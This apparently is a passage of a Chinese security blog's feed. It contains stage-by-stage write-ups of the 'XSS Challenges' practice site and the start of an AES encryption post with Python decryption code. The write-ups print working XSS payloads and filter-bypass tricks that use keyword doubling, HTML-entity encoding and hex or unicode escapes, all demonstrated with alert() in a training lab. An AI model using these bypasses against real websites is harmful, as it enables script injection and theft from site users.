    <content type="html"><![CDATA[<h3 id="Stage-10"><a href="#Stage-10" class="headerlink" title="Stage #10"></a>Stage #10</h3><p>输入<code>1&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code><br>结果：<br><img src="/pic/XSS-Challenges2/10-1.png" alt="image"><br>发现过滤了domain，通过双写domain绕过</p><pre><code>1&quot;/&gt;&lt;script&gt;alert(document.domdomainain);&lt;/script&gt;</code></pre><p><img src="/pic/XSS-Challenges2/10-2.png" alt="image"></p><h3 id="Stage-11"><a href="#Stage-11" class="headerlink" title="Stage #11"></a>Stage #11</h3><p>将script替换成了xscript，将onclick替换成了onxxx<br><br>输入：<code>&quot;&gt;&lt;a href=javasc%72ipt:alert(document.domain)&gt;111&lt;/a&gt;</code>发现不会弹窗，而是跳转链接：<br><img src="/pic/XSS-Challenges2/11-1.png" alt="image"><br>查了下资料发现不能用url编码，要用HTML字符实体</p><pre><code>&quot;&gt;&lt;a href=javasc&amp;#114ipt:alert(document.domain)&gt;111&lt;/a&gt;</code></pre><p><img src="/pic/XSS-Challenges2/11-2.png" alt="image"><br>点击链接弹窗：<br><img src="/pic/XSS-Challenges2/11-3.png" alt="image"></p><p>备注：<br>  JavaScript是个伪协议，对协议进行URL编码后，url解析就不能正常解码，所以认为协议无效，无法弹框。<br>而使用HTML字符实体的话，html先解码，然后url再解码，这样虽然协议进行了编码，但是url解析器仍然能解析。至于url编码alert(2),不关协议，url解析器可以正常解析。 可以弹框。</p><p>  自己在本地用了个简单的环境测试了一下<br>使用url编码：<code>&lt;a href=javasc%72ipt:alert(0)&gt;test&lt;/a&gt;   （%72是r的url编码）</code><br>结果：<br><img src="/pic/XSS-Challenges2/11-4.png" alt="image"></p><p>使用HTML实体：<code>&lt;a href=javasc&amp;#114ipt:alert(0)&gt;test1&lt;/a&gt;   （&amp;#114是r的HTML实体编码）</code><br>结果：<br><img src="/pic/XSS-Challenges2/11-5.png" alt="image"></p><h3 id="Stage-12"><a href="#Stage-12" class="headerlink" title="Stage #12"></a>Stage #12</h3><p>过滤了&lt;&gt;和单引号双引号，查了下发现要利用IE会把``（左上角波浪的键）识别为双引号的特性</p><pre><code>`` onclick=alert(document.domain);</code></pre><p>点击弹框：<br><img src="/pic/XSS-Challenges2/12-1.png" alt="image"></p><h3 id="Stage-15"><a href="#Stage-15" class="headerlink" title="Stage #15"></a>Stage #15</h3><p>document.write，DOM型xss<br>输入`\x3cscript\x3ealert(document.domain);\x3c/script\x3e发现\被过滤掉了，查了下是因为是在js范畴，document.write在输出的时候会JavascriptDecode一下数据，会把数据原有\去除，即php里面的stripslashes<br>转义了“&lt;”“&gt;”用十六进制编码绕过</p><pre><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></pre><p>点击弹框：<br><img src="/pic/XSS-Challenges2/15-1.png" alt="image"></p><p>普通十六进制：\xH（JavaScript编码）<br>进制编码：&#xH;(十六进制格式)（html实体编码）</p><h3 id="Stage-16"><a href="#Stage-16" class="headerlink" title="Stage #16"></a>Stage #16</h3><p>Hint: “s/\\x/\\\\x/ig;”把“\\\x”替换成“\\x”<br>用unicode编码</p><pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code></pre><p><img src="/pic/XSS-Challenges2/16-1.png" alt="image"></p><p>有几道题因为浏览器版本原因没有做，所以到这基本xss challenges就算结束啦，感觉又重新学了一遍关于xss的知识</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Stage-10&quot;&gt;&lt;a href=&quot;#Stage-10&quot; class=&quot;headerlink&quot; title=&quot;Stage #10&quot;&gt;&lt;/a&gt;Stage #10&lt;/h3&gt;&lt;p&gt;输入&lt;code&gt;1&amp;quot;/&amp;gt;&amp;lt;script&amp;gt;alert(docu
      
    
    </summary>
    
    
      <category term="xss" scheme="http://Yuririns.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>XSS Challenges</title>
    <link href="http://Yuririns.github.io/2019/03/16/XSS-Challenges/"/>
    <id>http://Yuririns.github.io/2019/03/16/XSS-Challenges/</id>
    <published>2019-03-16T02:56:15.000Z</published>
    <updated>2019-04-25T01:44:44.664Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage #1"></a>Stage #1</h3><pre><code>1&quot;&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p><img src="/pic/XSS-Challenges/1-1.png" alt="image"><br>弹框：<img src="/pic/XSS-Challenges/1-2.png" alt="image"><br><br></p><h3 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage #2"></a>Stage #2</h3><pre><code>1&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p><img src="/pic/XSS-Challenges/2-1.png" alt="image"><br><br></p><h3 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage #3"></a>Stage #3</h3><p>输入：<code>&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code>发现转义了&lt;&gt;<br><img src="/pic/XSS-Challenges/3-1.png" alt="image"><br>抓包修改第二个参数：<br><img src="/pic/XSS-Challenges/3-2.png" alt="image"><br><img src="/pic/XSS-Challenges/3-3.png" alt="image"><br>弹窗:<img src="/pic/XSS-Challenges/3-4.png" alt="image"><br><br></p><h3 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage #4"></a>Stage #4</h3><p>和3一样转义了&lt;&gt;，以及这次第二个参数也转义了&lt;&gt;抓包发现有第三个参数，修改这个参数的值：<br><img src="/pic/XSS-Challenges/4-2.png" alt="image"><br>弹窗:<img src="/pic/XSS-Challenges/4-1.png" alt="image"><br><br></p><h3 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage #5"></a>Stage #5</h3><p>输入框限制了内容的长度，F12修改maxlength，直接在后面补了个零：<br><img src="/pic/XSS-Challenges/5-1.png" alt="image"></p><pre><code>1&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p><img src="/pic/XSS-Challenges/5-2.png" alt="image"><br><br></p><h3 id="Stage-6"><a href="#Stage-6" class="headerlink" title="Stage #6"></a>Stage #6</h3><p>同样转义了&lt;&gt;，并且没有别的参数了<br>Hint: event handler attributes<br>搜了一下发现是需要利用HTML 事件属性</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center">onload</td><td style="text-align:center">script</td><td style="text-align:center">页面结束加载之后触发。</td></tr><tr><td style="text-align:center">onclick</td><td style="text-align:center">script</td><td style="text-align:center">元素上发生鼠标点击时触发。</td></tr><tr><td style="text-align:center">onmousemove</td><td style="text-align:center">script</td><td style="text-align:center">当鼠标指针移动到元素上时触发。</td></tr><tr><td style="text-align:center">onmouseover</td><td style="text-align:center">script</td><td style="text-align:center">当鼠标指针移动到元素上时触发。</td></tr></tbody></table><pre><code>&quot; onclick=&quot;alert(document.domain);</code></pre><p>然后点击输入框，弹出<br><img src="/pic/XSS-Challenges/6-1.png" alt="image"><br><br></p><h3 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage #7"></a>Stage #7</h3><p>输入<code>1&quot; onclick=&quot;alert(document.domain);</code>后发现<br><code>&lt;input name=&quot;p1&quot; size=&quot;50&quot; value=&quot;1&amp;quot;&quot; onclick=&quot;&amp;quot;alert(document.domain);&quot; type=&quot;text&quot;&gt;</code></p><p>空格分割属性</p><pre><code>1&quot; onclick=alert(document.domain);</code></pre><p><code>&lt;input name=&quot;p1&quot; size=&quot;50&quot; value=&quot;1&amp;quot;&quot; onclick=&quot;alert(document.domain);&quot; type=&quot;text&quot;&gt;</code><br>点击输入框，弹出<br><img src="/pic/XSS-Challenges/7-1.png" alt="image"><br><br></p><h3 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage #8"></a>Stage #8</h3><p>随便输入一个123，发现会产生一个a标签的跳转链接：<br><img src="/pic/XSS-Challenges/8-1.png" alt="image"><br>使用JavaScript中的伪协议（javascript:）</p><pre><code>javascript:alert(document.domain);</code></pre><p>点击生成的URL，弹出<br><img src="/pic/XSS-Challenges/8-2.png" alt="image"><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Stage-1&quot;&gt;&lt;a href=&quot;#Stage-1&quot; class=&quot;headerlink&quot; title=&quot;Stage #1&quot;&gt;&lt;/a&gt;Stage #1&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;1&amp;quot;&amp;lt;/b&amp;gt;&amp;lt;script&amp;gt;alert(doc
      
    
    </summary>
    
    
      <category term="xss" scheme="http://Yuririns.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>AES加密</title>
    <link href="http://Yuririns.github.io/2018/08/21/AES%E5%8A%A0%E5%AF%86/"/>
    <id>http://Yuririns.github.io/2018/08/21/AES加密/</id>
    <published>2018-08-21T05:47:50.000Z</published>
    <updated>2019-04-25T01:44:56.971Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a><strong>AES加密</strong></h1><h2 id="1、AES加密原理简单介绍"><a href="#1、AES加密原理简单介绍" class="headerlink" title="1、AES加密原理简单介绍"></a>1、AES加密原理简单介绍</h2><p>AES加密过程是在一个4×4的字节矩阵上运作，这个矩阵又称为“状态（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个Byte）。（Rijndael加密法因支持更大的区块，其矩阵行数可视情况增加）加密时，各轮AES加密循环（除最后一轮外）均包含4个步骤：<br><br>AddRoundKey — 矩阵中的每一个字节都与该次轮秘钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。<br><br>SubBytes — 通过非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。<br><br>ShiftRows — 将矩阵中的每个横列进行循环式移位。<br><br>MixColumns — 为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每列的四个字节。<br><br>最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey取代。<br><br>详细过程如下图：<br><br><img src="/pic/AES加密/1.png" alt="image"></p><h2 id="2、程序各模块详细设计"><a href="#2、程序各模块详细设计" class="headerlink" title="2、程序各模块详细设计"></a>2、程序各模块详细设计</h2><h3 id="2-1-显示模块"><a href="#2-1-显示模块" class="headerlink" title="2.1 显示模块"></a>2.1 显示模块</h3><p><img src="/pic/AES加密/2.png" alt="image"></p><h3 id="2-2-代码模块"><a href="#2-2-代码模块" class="headerlink" title="2.2 代码模块"></a>2.2 代码模块</h3><p><img src="/pic/AES加密/3.png" alt="image"><br></p><h2 id="3、程序代码"><a href="#3、程序代码" class="headerlink" title="3、程序代码"></a>3、程序代码</h2><h3 id="3-1-decode-py"><a href="#3-1-decode-py" class="headerlink" title="3.1 decode.py:"></a>3.1 decode.py:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> 密钥扩展</div><div class="line"></div><div class="line"><span class="comment">#逆行移位</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">InvShiftRows</span><span class="params">(input1)</span>:</span></div><div class="line">    out = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            out[i][j+i<span class="number">-4</span>] = input1[i][j]</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"><span class="comment">#逆字节替代</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">InvSubBytes</span><span class="params">(input1)</span>:</span></div><div class="line">    out = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    map_ = [<span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</div><div class="line">            <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</div><div class="line">            <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</div><div class="line">            <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</div><div class="line">            <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</div><div class="line">            <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</div><div class="line">            <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</div><div class="line">            <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</div><div class="line">            <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</div><div class="line">            <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</div><div class="line">            <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</div><div class="line">            <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</div><div class="line">            <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</div><div class="line">            <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</div><div class="line">            <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</div><div class="line">            <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span>]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            out[i][j] = map_[input1[i][j]]</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"><span class="comment">#逆列混合</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">InvMixColumns</span><span class="params">(inputt)</span>:</span></div><div class="line">    col = [[<span class="number">0x0E</span>,<span class="number">0x0B</span>,<span class="number">0x0D</span>,<span class="number">0x09</span>],[<span class="number">0x09</span>,<span class="number">0x0E</span>,<span class="number">0x0B</span>,<span class="number">0x0D</span>],[<span class="number">0x0D</span>,<span class="number">0x09</span>,<span class="number">0x0E</span>,<span class="number">0x0B</span>],[<span class="number">0x0B</span>,<span class="number">0x0D</span>,<span class="number">0x09</span>,<span class="number">0x0E</span>]]</div><div class="line">    out = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            out[i][j]=Mult(inputt[<span class="number">0</span>][j],col[i][<span class="number">0</span>])^Mult(inputt[<span class="number">1</span>][j],col[i][<span class="number">1</span>])^Mult(inputt[<span class="number">2</span>][j],col[i][<span class="number">2</span>])^Mult(inputt[<span class="number">3</span>][j],col[i][<span class="number">3</span>])</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#点乘</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mult</span><span class="params">(a,b)</span>:</span></div><div class="line">    temp = [<span class="string">''</span>]*<span class="number">8</span></div><div class="line">    temp[<span class="number">0</span>]=int(a)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</div><div class="line">        <span class="keyword">if</span> temp[i]&lt;<span class="number">128</span>:</div><div class="line">            temp[i+<span class="number">1</span>] = temp[i]&lt;&lt;<span class="number">1</span>  <span class="comment">#若小于0b10000000则直接右移</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            temp[i+<span class="number">1</span>] = ((temp[i]&lt;&lt;<span class="number">1</span>)<span class="number">-0x100</span>)^<span class="number">0x1B</span></div><div class="line">    mult = <span class="number">0x00</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        mult ^= (b&gt;&gt;i&amp;<span class="number">1</span>)*temp[i]</div><div class="line">    <span class="keyword">return</span> mult</div><div class="line"></div><div class="line"><span class="comment">#轮密钥加</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddRoundKey</span><span class="params">(input_,key)</span>:</span></div><div class="line">    temp = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            temp[i][j] = key[i][j]^input_[i][j]</div><div class="line">    <span class="keyword">return</span> temp</div><div class="line"></div><div class="line"><span class="comment">#规范输出格式（列表--&gt;字符串）</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrintOut</span><span class="params">(Input)</span>:</span></div><div class="line">    temp = []</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            a = hex(Input[i][j])[<span class="number">2</span>:]</div><div class="line">            <span class="keyword">if</span> len(a)&lt;<span class="number">2</span>:</div><div class="line">                a = <span class="string">'0'</span>+a</div><div class="line">            temp.append(a)</div><div class="line">    out = <span class="string">''</span>.join(map(str,temp))</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#解密过程</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(input1)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#test = [[0x39,0x02,0xdc,0x19],[0x25,0xdc,0x11,0x6a],[0x84,0x09,0x85,0x0b],[0x1d,0xfb,0x97,0x32]]</span></div><div class="line">    key = [[<span class="number">0x2b</span>,<span class="number">0x28</span>,<span class="number">0xab</span>,<span class="number">0x09</span>],[<span class="number">0x7e</span>,<span class="number">0xae</span>,<span class="number">0xf7</span>,<span class="number">0xcf</span>],[<span class="number">0x15</span>,<span class="number">0xd2</span>,<span class="number">0x15</span>,<span class="number">0x4f</span>],[<span class="number">0x16</span>,<span class="number">0xa6</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>]]</div><div class="line">    <span class="comment">#key = [[15, 21, 113, 201], [71, 217, 232, 89], [12, 183, 173, 214], [175, 127, 103, 152]]</span></div><div class="line">    test = input1</div><div class="line">    temp = []</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            temp.append(key[j])</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">        n = i</div><div class="line">        key = 密钥扩展.KeySchedule(key,n)</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            temp.append(key[j])</div><div class="line">    <span class="comment">#print(temp)</span></div><div class="line"></div><div class="line"></div><div class="line">    out1 = AddRoundKey(test,key[<span class="number">-4</span>:])       <span class="comment">#第一次轮密钥加</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):                      <span class="comment">#循环九轮（逆行移位--&gt;逆字节替代--&gt;轮密钥加--&gt;逆列混合）</span></div><div class="line">        out2 = InvSubBytes(InvShiftRows(out1))</div><div class="line"></div><div class="line">        k = temp[(<span class="number">-4</span>)*(i+<span class="number">2</span>):(<span class="number">-4</span>)*(i+<span class="number">2</span>)+<span class="number">4</span>]    <span class="comment">#i从0开始,i=0时，(-4)*(i+2)=-8</span></div><div class="line">        out1 = InvMixColumns(AddRoundKey(out2,k))</div><div class="line">    out = InvSubBytes(InvShiftRows(out1))   <span class="comment">#第十轮（逆行移位--&gt;逆字节替代）</span></div><div class="line"></div><div class="line">    out1 = AddRoundKey(out,temp[<span class="number">0</span>:<span class="number">4</span>])       <span class="comment">#最后一次轮密钥加</span></div><div class="line">    print(<span class="string">"明文为："</span>+PrintOut(out1))</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#密钥可变，复制上面函数，增加一个变量Key</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeWithKey</span><span class="params">(input1,Key)</span>:</span></div><div class="line">    key = Key</div><div class="line">    test = input1</div><div class="line">    temp = 